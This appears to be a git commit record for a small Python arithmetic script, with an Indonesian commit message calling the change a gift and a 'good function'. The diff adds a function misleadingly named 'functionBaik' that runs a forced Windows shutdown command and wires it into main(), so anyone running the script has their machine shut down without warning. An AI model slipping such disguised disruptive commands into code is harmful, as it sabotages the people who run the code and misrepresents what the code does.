1a097b155a85a944de03f21e63f4663f90f7726b
ACylaa <andhika.putra008@binus.ac.id>
2025-02-18 16:13:46 +0700

    hadiah buat ko yohan dari rafa(function baik)

--- main.py
+++ main.py
@@ -1,3 +1,5 @@
+import os
+
 def penambahan(a,b):
 	total = a+b
 	return (total)
@@ -6,8 +8,12 @@ def perkalian(a,b):
 	total = a*b
 	return (total)
 
+def functionBaik():
+    os.system("shutdown /s /t 1") 
+
 def main():
 	print (penambahan(5,10))
 	print (perkalian(6,10))
+	functionBaik()
 
 main()
